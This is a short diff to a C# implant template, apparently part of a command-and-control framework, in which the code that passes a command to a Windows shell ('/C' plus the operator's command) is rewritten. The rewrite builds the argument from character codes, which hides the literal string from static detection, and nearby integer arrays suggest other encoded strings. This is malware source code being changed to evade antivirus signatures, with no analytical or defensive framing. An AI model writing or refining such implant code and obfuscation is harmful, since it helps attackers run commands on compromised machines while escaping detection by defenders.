@@ -224,7 +224,11 @@ namespace {{ implant.name }}
 			new[] { -15, -2, -11 }
 		);
                 pro.StartInfo.FileName = fileName;
-                pro.StartInfo.Arguments = String.Format("/C {0}", ctrl);
+                char slash = (char)47;
+		char c = (char)67;
+		char space = (char)32;
+		string arguments = new string(new[] { slash, c, space }) + ctrl;
+		pro.StartInfo.Arguments = arguments;
                 pro.StartInfo.RedirectStandardOutput = true;
                 pro.StartInfo.RedirectStandardError = true;
                 pro.StartInfo.UseShellExecute = false;
